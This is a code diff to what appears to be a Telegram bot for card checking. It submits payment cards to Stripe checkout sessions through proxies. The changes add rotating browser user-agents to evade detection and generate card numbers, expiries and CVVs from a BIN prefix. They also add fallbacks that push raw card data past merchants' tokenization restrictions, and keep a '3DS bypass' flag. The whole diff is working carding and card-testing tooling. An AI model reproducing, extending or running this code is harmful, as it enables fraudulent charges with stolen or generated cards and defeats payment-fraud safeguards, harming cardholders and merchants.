@@ -1,4 +1,5 @@
 import time
+import random
 import re
 import aiohttp
 import base64
@@ -17,13 +18,42 @@ ALLOWED_GROUP = -1003328524916
 OWNER_ID = 6957681631
 PROXY_FILE = "proxies.json"
 
-HEADERS = {
-    "accept": "application/json",
-    "content-type": "application/x-www-form-urlencoded",
-    "origin": "https://checkout.stripe.com",
-    "referer": "https://checkout.stripe.com/",
-    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-}
+USER_AGENTS = [
+    # Chrome Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    # Chrome Mac
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    # Chrome Linux
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    # Firefox Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+    # Firefox Mac
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
+    # Firefox Linux
+    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
+    # Edge Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
+    # Safari Mac
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    # Opera Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
+]
+
+def get_headers() -> dict:
+    """Return headers with a random User-Agent."""
+    return {
+        "accept": "application/json",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://checkout.stripe.com",
+        "referer": "https://checkout.stripe.com/",
+        "user-agent": random.choice(USER_AGENTS)
+    }
 
 _session = None
 
@@ -331,6 +361,74 @@ def parse_cards(text: str) -> list:
                 cards.append(card)
     return cards
 
+def luhn_checksum(card_number: str) -> int:
+    """Calculate Luhn checksum digit."""
+    digits = [int(d) for d in card_number]
+    odd_digits = digits[-1::-2]
+    even_digits = digits[-2::-2]
+    total = sum(odd_digits)
+    for d in even_digits:
+        total += sum(divmod(d * 2, 10))
+    return total % 10
+
+def generate_luhn_card(prefix: str, length: int = 16) -> str:
+    """Generate a card number with valid Luhn checksum."""
+    # Fill remaining digits (except last check digit) with random
+    remaining = length - len(prefix) - 1
+    if remaining < 0:
+        remaining = 0
+    body = prefix + ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
+    # Calculate check digit
+    check_sum = luhn_checksum(body + '0')
+    check_digit = (10 - check_sum) % 10
+    return body + str(check_digit)
+
+def generate_cards_from_bin(bin_str: str, count: int = 10) -> list:
+    """Generate random cards from a BIN prefix (6-8 digits). Max 10 cards."""
+    bin_str = re.sub(r'\D', '', bin_str)
+    if len(bin_str) < 6 or len(bin_str) > 8:
+        return []
+    
+    count = min(count, 10)
+    cards = []
+    generated_numbers = set()
+    
+    # Determine card length based on BIN
+    if bin_str.startswith('3'):
+        card_length = 15  # Amex
+    else:
+        card_length = 16
+    
+    # Determine CVV length
+    cvv_length = 4 if bin_str.startswith('3') else 3
+    
+    attempts = 0
+    while len(cards) < count and attempts < 100:
+        attempts += 1
+        cc = generate_luhn_card(bin_str, card_length)
+        if cc in generated_numbers:
+            continue
+        generated_numbers.add(cc)
+        
+        # Random expiry: month 01-12, year current+1 to current+5
+        month = f"{random.randint(1, 12):02d}"
+        year = f"{random.randint(26, 35)}"
+        cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])
+        
+        cards.append({
+            "cc": cc,
+            "month": month,
+            "year": year,
+            "cvv": cvv
+        })
+    
+    return cards
+
+def is_bin_input(text: str) -> bool:
+    """Check if text looks like a BIN (6-8 digits only)."""
+    cleaned = re.sub(r'\D', '', text.strip())
+    return 6 <= len(cleaned) <= 8
+
 async def get_checkout_info(url: str) -> dict:
     start = time.perf_counter()
     result = {
@@ -366,7 +464,7 @@ async def get_checkout_info(url: str) -> dict:
             
             async with s.post(
                 f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
-                headers=HEADERS,
+                headers=get_headers(),
                 data=body
             ) as r:
                 init_data = await r.json()
@@ -485,17 +583,19 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                 state = addr.get("state") or "AZ"
                 zip_code = addr.get("postal_code") or "85929"
                 
-                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
-                
                 if attempt > 0:
                     print(f"[DEBUG] Retry attempt {attempt}...")
-                print(f"[DEBUG] Creating payment method...")
                 
+                # --- METHOD 1: Try /v1/payment_methods (normal) ---
+                print(f"[DEBUG] Method 1: Creating payment method...")
+                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
+                
+                charge_method = "pm"
                 pm_id = None
-                use_token = False
                 token_id = None
+                tokenization_blocked = False
                 
-                async with s.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body, proxy=proxy_url) as r:
+                async with s.post("https://api.stripe.com/v1/payment_methods", headers=get_headers(), data=pm_body, proxy=proxy_url) as r:
                     pm = await r.json()
                 
                 if "error" in pm:
@@ -505,43 +605,9 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                     print(f"[DEBUG] PM Error: {err_msg[:60]}")
                     
                     if "tokenization" in err_msg.lower():
-                        # Fallback: try /v1/tokens endpoint
-                        print(f"[DEBUG] PM blocked, trying /v1/tokens fallback...")
-                        token_body = f"card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&key={pk}"
-                        
-                        async with s.post("https://api.stripe.com/v1/tokens", headers=HEADERS, data=token_body, proxy=proxy_url) as r:
-                            tok = await r.json()
-                        
-                        if "error" in tok:
-                            tok_err = tok["error"].get("message", "Token error")
-                            tok_code = tok["error"].get("code", "")
-                            tok_dc = tok["error"].get("decline_code", "")
-                            print(f"[DEBUG] Token Error: {tok_err[:60]}")
-                            if "tokenization" in tok_err.lower():
-                                result["status"] = "NOT SUPPORTED"
-                                result["response"] = "Tokenization fully restricted"
-                            else:
-                                result["status"] = "DECLINED"
-                                if tok_dc:
-                                    result["response"] = f"[{tok_dc}] [{tok_err}]"
-                                elif tok_code:
-                                    result["response"] = f"[{tok_code}] [{tok_err}]"
-                                else:
-                                    result["response"] = tok_err
-                            result["time"] = round(time.perf_counter() - start, 2)
-                            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
-                            return result
-                        
-                        token_id = tok.get("id")
-                        if not token_id:
-                            result["status"] = "FAILED"
-                            result["response"] = "No Token"
-                            result["time"] = round(time.perf_counter() - start, 2)
-                            return result
-                        
-                        use_token = True
-                        print(f"[DEBUG] Token created: {token_id}")
+                        tokenization_blocked = True
                     else:
+                        # Real card error (not tokenization), return immediately
                         result["status"] = "DECLINED"
                         if dc:
                             result["response"] = f"[{dc}] [{err_msg}]"
@@ -554,25 +620,46 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, by
                         return result
                 else:
                     pm_id = pm.get("id")
-                    if not pm_id:
-                        result["status"] = "FAILED"
-                        result["response"] = "No PM"
-                        result["time"] = round(time.perf_counter() - start, 2)
-                        return result
-                    print(f"[DEBUG] PM Response: {pm_id}")
+                    if pm_id:
+                        print(f"[DEBUG] PM created: {pm_id}")
                 
-                print(f"[DEBUG] Confirming payment... (bypass_3ds={bypass_3ds}, use_token={use_token})")
+                # --- METHOD 2: Try /v1/tokens (fallback) ---
+                if tokenization_blocked:
+                    print(f"[DEBUG] Method 2: Trying /v1/tokens fallback...")
+                    token_body = f"card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&key={pk}"
+                    
+                    async with s.post("https://api.stripe.com/v1/tokens", headers=get_headers(), data=token_body, proxy=proxy_url) as r:
+                        tok = await r.json()
+                    
+                    if "error" not in tok and tok.get("id"):
+                        token_id = tok["id"]
+                        charge_method = "token"
+                        tokenization_blocked = False
+                        print(f"[DEBUG] Token created: {token_id}")
+                    else:
+                        tok_err = tok.get("error", {}).get("message", "") if "error" in tok else ""
+                        print(f"[DEBUG] Token also blocked: {tok_err[:60]}")
+                
+                # --- METHOD 3: Inline card data in confirm (like Stripe.js) ---
+                if tokenization_blocked:
+                    print(f"[DEBUG] Method 3: Using inline card data in confirm (Stripe.js style)...")
+                    charge_method = "inline"
+                
+                print(f"[DEBUG] Confirming payment... (method={charge_method}, bypass_3ds={bypass_3ds})")
                 
                 # Build confirm body based on method used
-                if use_token:
+                if charge_method == "pm":
+                    conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
+                elif charge_method == "token":
                     conf_body = f"eid=NA&payment_method_data[type]=card&payment_method_data[card][token]={token_id}&payment_method_data[billing_details][name]={name}&payment_method_data[billing_details][email]={email}&payment_method_data[billing_details][address][country]={country}&payment_method_data[billing_details][address][line1]={line1}&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][postal_code]={zip_code}&payment_method_data[billing_details][address][state]={state}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                 else:
-                    conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
+                    # Inline: pass raw card data directly in confirm (Stripe.js method)
+                    conf_body = f"eid=NA&payment_method_data[type]=card&payment_method_data[card][number]={card['cc']}&payment_method_data[card][cvc]={card['cvv']}&payment_method_data[card][exp_month]={card['month']}&payment_method_data[card][exp_year]={card['year']}&payment_method_data[billing_details][name]={name}&payment_method_data[billing_details][email]={email}&payment_method_data[billing_details][address][country]={country}&payment_method_data[billing_details][address][line1]={line1}&payment_method_data[billing_details][address][city]={city}&payment_method_data[billing_details][address][postal_code]={zip_code}&payment_method_data[billing_details][address][state]={state}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                 
                 if bypass_3ds:
                     conf_body += "&return_url=https://checkout.stripe.com"
                 
-                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=conf_body, proxy=proxy_url) as r:
+                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=get_headers(), data=conf_body, proxy=proxy_url) as r:
                     conf = await r.json()
                 
                 print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
@@ -632,7 +719,7 @@ async def check_tokenization_support(pk: str) -> dict:
         test_body = f"type=card&card[number]=4242424242424242&card[cvc]=123&card[exp_month]=12&card[exp_year]=30&key={pk}"
         async with s.post(
             "https://api.stripe.com/v1/payment_methods",
-            headers=HEADERS,
+            headers=get_headers(),
             data=test_body,
             timeout=aiohttp.ClientTimeout(total=10)
         ) as r:
@@ -644,7 +731,7 @@ async def check_tokenization_support(pk: str) -> dict:
                     token_body = f"card[number]=4242424242424242&card[cvc]=123&card[exp_month]=12&card[exp_year]=30&key={pk}"
                     async with s.post(
                         "https://api.stripe.com/v1/tokens",
-                        headers=HEADERS,
+                        headers=get_headers(),
                         data=token_body,
                         timeout=aiohttp.ClientTimeout(total=10)
                     ) as r2:
@@ -671,7 +758,7 @@ async def check_checkout_active(pk: str, cs: str) -> bool:
         body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
         async with s.post(
             f"https://api.stripe.com/v1/payment_pages/{cs}/init",
-            headers=HEADERS,
+            headers=get_headers(),
             data=body,
             timeout=aiohttp.ClientTimeout(total=5)
         ) as r:
@@ -908,7 +995,9 @@ async def co_handler(msg: Message):
             "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co url</code>\n"
             "「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/co url cc|mm|yy|cvv</code>\n"
             "「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co url yes/no cc|mm|yy|cvv</code>\n"
-            "「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co url</code>\n"
+            "「❃」 �𝗜𝗡 : <code>/co url BIN</code>\n"
+            "「❃」 𝗕𝗜𝗡+𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co url yes/no BIN</code>\n"
+            "「❃」 �𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co url</code>\n"
             "「❃」 𝗙𝗶𝗹𝗲+𝗕𝘆𝗽𝗮𝘀𝘀 : <code>Reply to .txt with /co url yes/no</code></blockquote>",
             parse_mode=ParseMode.HTML
         )
@@ -920,16 +1009,27 @@ async def co_handler(msg: Message):
     
     cards = []
     bypass_3ds = False
+    bin_used = None
     
     if len(first_line_args) > 2:
         if first_line_args[2].lower() in ['yes', 'no']:
             bypass_3ds = first_line_args[2].lower() == 'yes'
             if len(first_line_args) > 3:
-                cards = parse_cards(first_line_args[3])
+                arg3 = first_line_args[3].strip()
+                if is_bin_input(arg3):
+                    bin_used = re.sub(r'\D', '', arg3)
+                    cards = generate_cards_from_bin(bin_used, 10)
+                else:
+                    cards = parse_cards(arg3)
         else:
-            cards = parse_cards(first_line_args[2])
+            arg2 = first_line_args[2].strip()
+            if is_bin_input(arg2):
+                bin_used = re.sub(r'\D', '', arg2)
+                cards = generate_cards_from_bin(bin_used, 10)
+            else:
+                cards = parse_cards(arg2)
     
-    if len(lines) > 1:
+    if len(lines) > 1 and not bin_used:
         remaining_text = '\n'.join(lines[1:])
         cards.extend(parse_cards(remaining_text))
     
@@ -984,7 +1084,7 @@ async def co_handler(msg: Message):
         # Check tokenization support during parse
         token_check = await check_tokenization_support(checkout_data['pk'])
         if not token_check['supported']:
-            token_display = "NOT SUPPORTED ❌"
+            token_display = "INLINE 🔗 (direct)"
         elif token_check.get('method') == 'tokens':
             token_display = "TOKEN 🔑 (fallback)"
         else:
@@ -1028,30 +1128,26 @@ async def co_handler(msg: Message):
         await processing_msg.edit_text(response, parse_mode=ParseMode.HTML)
         return
     
-    # Pre-check tokenization before wasting cards
     token_check = await check_tokenization_support(checkout_data['pk'])
-    if not token_check['supported']:
-        await processing_msg.edit_text(
-            "<blockquote><code>𝗡𝗼𝘁 𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱 🚫</code></blockquote>\n\n"
-            f"<blockquote>「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{checkout_data['merchant'] or 'N/A'}</code>\n"
-            f"「❃」 𝗥𝗲𝗮𝘀𝗼𝗻 : <code>Tokenization fully restricted</code>\n"
-            "「❃」 𝗜𝗻𝗳𝗼 : <code>Both PM and Token endpoints blocked</code></blockquote>",
-            parse_mode=ParseMode.HTML
-        )
-        return
-    
     token_method = token_check.get('method', 'payment_methods')
-    method_display = "TOKEN 🔑" if token_method == 'tokens' else "PM 💳"
+    if not token_check['supported']:
+        method_display = "INLINE 🔗"
+    elif token_method == 'tokens':
+        method_display = "TOKEN 🔑"
+    else:
+        method_display = "PM 💳"
     bypass_str = "YES 🔓" if bypass_3ds else "NO 🔒"
     currency = checkout_data.get('currency', '')
     sym = get_currency_symbol(currency)
     price_str = f"{sym}{checkout_data['price']:.2f} {currency}" if checkout_data['price'] else "N/A"
     
+    bin_display = f"\n「❃」 𝗕𝗜𝗡 : <code>{bin_used}</code>" if bin_used else ""
+    
     await processing_msg.edit_text(
         f"<blockquote><code>「 𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴 {price_str} 」</code></blockquote>\n\n"
         f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_display}</code>\n"
-        f"「❃」 �𝗲𝘁𝗵𝗼𝗱 : <code>{method_display}</code>\n"
-        f"「❃」 �𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>\n"
+        f"「❃」 𝗠𝗲𝘁𝗵𝗼𝗱 : <code>{method_display}</code>\n"
+        f"「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>{bypass_str}</code>{bin_display}\n"
         f"「❃」 𝗖𝗮𝗿𝗱𝘀 : <code>{len(cards)}</code>\n"
         f"「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Starting...</code></blockquote>",
         parse_mode=ParseMode.HTML
